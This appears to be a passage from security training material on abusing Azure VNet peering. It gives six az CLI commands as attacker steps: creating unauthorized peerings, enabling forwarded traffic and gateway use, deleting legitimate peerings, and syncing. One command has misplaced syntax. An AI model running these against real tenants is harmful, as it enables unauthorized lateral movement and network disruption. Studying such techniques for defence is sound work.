Virtual Network (VNet) peering connections are a feature of Azure that enables the connection and communication of two or more virtual machines for sharing information. 

Attackers can exploit a VNet to move laterally within the network and gain illegitimate access to crucial resources. 

This allows them to perform malicious activities such as exfiltrating data and maintaining persistence

Attackers can use the following steps to exploit VNet peering connections:

▪ Run the following command to create unauthorized peering connections:
az network vnet peering create -g TargetResourceGroup -n AttackerVnetToTargetVnet --vnet-name AttackerVnet --remote-vnet TargetVnetId --allow-vnet-access

By creating peer connections between virtual networks, attackers can establish network paths that allow them to traverse one VNet to another


▪ Run the following command to enable traffic forwarding:
az network vnet peering update -g TargetResourceGroup -n AttackerVnetToTargetVnet --vnet-name AttackerVnet --set allowForwardedTraffic=true

Once peered, attackers can enable traffic forwarding to allow traffic from compromised VMs to traverse the peered VNet, potentially bypassing security controls.


▪ Run the following command to initiate remote gateway usage:
az network vnet peering update -g TargetResourceGroup -n AttackerVnetToTargetVnet --vnet-name AttackerVnet --set useRemoteGateways=true 

Attackers can configure peering to use remote gateways, enabling them to leverage the target VNet gateway to access additional networks or on-premise resources.


▪ Run the following command to enable gateway transit:
az network vnet peering update -g TargetResourceGroup -n AttackerVnetToTargetVnet allowGatewayTransit=true --vnet-name AttackerVnet --set
If the target VNet uses a VPN gateway, attackers can enable gateway transit, allowing them to use the VPN gateway of the target VNet to access the network


▪ Run the following command to delete legitimate peerings:
az network vnet peering delete -g TargetResourceGroup -n TargetVnetToAnotherVnet --vnet-name TargetVnet 
By deleting existing legitimate peer connections, attackers can disrupt normal network paths and force traffic through compromised or malicious paths.


▪ Run the following command to synchronize peering connections:
az network vnet peering sync -g TargetResourceGroup -n AttackerVnetToTargetVnet --vnet-name AttackerVnet 
This command allows attackers to ensure that their changes are synchronized across the peering connections to enforce their configurations.
